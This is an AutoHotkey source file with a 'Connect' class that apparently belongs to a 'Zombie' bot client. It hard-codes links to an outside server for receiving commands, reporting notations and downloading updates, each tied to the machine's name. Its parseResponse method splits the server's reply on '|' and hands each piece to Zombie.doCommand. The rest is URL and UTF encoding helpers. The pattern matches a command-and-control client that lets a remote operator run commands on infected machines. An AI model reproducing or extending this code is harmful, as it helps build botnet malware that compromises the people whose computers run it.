; @Connect
class Connect
{
	static receiveLink := "http://www.izzaki.pl/zombie/receive/" . Zombie.getName()
	static notationLink:= "http://www.izzaki.pl/zombie/notation/" . Zombie.getName()
	static updateLink := "http://www.izzaki.pl/zombie/download"
	
	getNotationLink(notation){
		return this.notationLink . "&notation=" . notation
	}
	
	parseResponse(response)
	{
		if(!response){
			return false
		}
		
		commands := strSplit(response, "|")
		
		for c in commands{
			command := commands[c]		
			Zombie.doCommand(command)
		}
	}
	
	toFile(response){
		if(fileExist("response.html"))
			fileDelete, response.html
		fileAppend, % response, response.html
	}
	
	urlDecode(str){
		Loop
			If RegExMatch(str, "i)(?<=%)[\da-f]{1,2}", hex)
				StringReplace, str, str, `%%hex%, % Chr("0x" . hex), All
			Else Break
		Return, str
	}

	urlEncode(str){
		f = %A_FormatInteger%
		SetFormat, Integer, Hex
		If RegExMatch(str, "^\w+:/{0,2}", pr)
			StringTrimLeft, str, str, StrLen(pr)
		StringReplace, str, str, `%, `%25, All
		Loop
			If RegExMatch(str, "i)[^\w\.~%]", char)
				StringReplace, str, str, %char%, % "%" . Asc(char), All
			Else Break
		SetFormat, Integer, %f%
		Return, pr . str
	}
	
	UtfDecode(str){
		RawLen := StrLen(str)

		Charset := 0    ; Put 1252 or 0

		BufSize := (RawLen + 1) * 2
		VarSetCapacity(Buf, BufSize, 0)

		DllCall("MultiByteToWideChar", "uint", 65001, "int", 0, "str", str
		, "int", -1, "uint", &Buf, "uint", RawLen + 1)
		DllCall("WideCharToMultiByte", "uint", Charset, "int", 0, "uint", &Buf, "int", -1
		, "str", str, "uint", RawLen + 1
		, "int", 0, "int", 0)
		Return str
	}

	UtfEncode(str){
		RawLen := StrLen(str)

		BufSize := (RawLen + 1) * 2
		VarSetCapacity(Buf1, BufSize, 0)    ; For UTF-16.
		VarSetCapacity(Buf2, BufSize, 0)    ; For UTF-8.

		DllCall("MultiByteToWideChar", "uint", 0, "int", 0, "str", str
		, "int", -1, "uint", &Buf1, "uint", RawLen + 1)
		DllCall("WideCharToMultiByte", "uint", 65001, "int", 0, "uint", &Buf1
		, "int", -1, "str", Buf2, "uint", BufSize
		, "int", 0, "int", 0)
		Return Buf2
	}
}